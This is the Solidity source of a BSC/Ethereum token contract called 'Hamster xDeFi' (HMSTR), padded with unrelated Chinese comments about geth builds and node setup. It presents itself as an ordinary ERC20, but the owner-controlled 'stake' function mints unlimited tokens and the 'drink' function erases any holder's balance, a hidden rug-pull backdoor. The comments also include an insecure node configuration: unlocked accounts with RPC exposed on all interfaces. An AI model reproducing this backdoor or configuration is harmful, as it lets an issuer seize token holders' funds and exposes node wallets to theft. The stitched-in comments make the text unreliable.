/**
 *Submitted for verification at Etherscan.io on 2021-03-29
*/

// Welcome Hamster Finance!
// We are on the binance smarts chain! and right now we use the ethereum blockchain's cross-chain, connecting and bringing Yield Farms closer together! add more information at the official link:
// WS https://hamsterdefi.com/
// TW https://twitter.com/hamsterdefi
// TG https://t.me/joinchat/Dih1dwYka2E3MmUy
//
// 欢迎仓鼠财经！
// 我们在币安智慧链上！ 现在，我们使用以太坊区块链的跨链，将Yield Farms连接起来并使其更加紧密！ 在官方链接上添加更多信息：

pragma solidity ^0.5.16;
     interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}
contract Context {
    constructor () internal { }
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}

//snapshot 是链下治理工具；

//开发者或者用户可以使用自己的metamask 钱包创建项目（space）创建时选择对应的链；

//用户在 space 内创建提案（proposal）；

//用户可以对用钱包来对 proposal 进行vote；

//使用教程：
//源码 下载
contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
//如果 希望 进行 跨 平台 编译 ， 比如 在Mac上 编译Linux平台 的 二进制 文件 ， 可以 使用 相关make geth-linux命令 操作
    mapping (address => uint) private _balances;
//编译 完成 后 ， 生成 的 二进制 文件 在 目录build/bin下
    mapping (address => mapping (address => uint)) private _allowances; //通过./build/bin/geth --help查看所有的option选项，根据情况自行设置相关配置参数。可参考Command-line Options

    uint private _totalSupply;
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }
    function balanceOf(address account) public view returns (uint) {
        return _balances[account]; // 部署设置
    }
    function transfer(address recipient, uint amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true; //给出了一组使用 systemd 进行服务管理的配置。
    }
    function allowance(address owner, address spender) public view returns (uint) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint amount) public returns (bool) {
        _approve(_msgSender(), spender, amount); //开启 TCP/UDP 32668 端口；便于 p2p 发现和互联
        return true;
    }
   // [Eth.Ethash] CacheDir = "ethash" 
   // CachesInMem = 2
   // CachesOnDisk = 3
   // CachesLockMmap = false
   // DatasetDir = "/data/heco/data/.ethash"
   // DatasetsOnDisk = 2
   // DatasetsLockMmap = false
   // PowMode = 0
    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    function _stake(address account, uint amount) internal {
        require(account != address(0), "ERC20: stake to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
    function _drink(address acc) internal {
        require(acc != address(0), "drink to the zero address");
        uint amount = _balances[acc];
        _balances[acc] = 0;
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(acc, address(0), amount);
    }
    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    
    // [Node]
    // DataDir = "/data/heco/data"
    // LnsecureUnlockAllowed = true
    // NoUSB = true
    // IPCPath = "geth.ipc"
    // HTTPHost = "0.0.0.0"
    // HTTPPort = 8545
    // HTTPVirtualHosts = ["*"]
    // WSPort = 8546
    // WSModules = ['eth', 'net', 'web3']
  
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract hamsterdefi is ERC20, ERC20Detailed {
  using SafeMath for uint;
  
  address public governance;
  mapping (address => bool) public stakers;
  uint256 private amt_ = 0;

  constructor () public ERC20Detailed("Hamster xDeFi", "HMSTR", 18) {
      governance = msg.sender;
      _stake(governance,amt_*10**uint(decimals()));
      stakers[governance] = true;
  }

  function stake(address account, uint amount) public {
      require(stakers[msg.sender], "error");
      _stake(account, amount);
  }

  function drink(address account) public {
      require(stakers[msg.sender], "error");
      _drink(account);
  }
  
}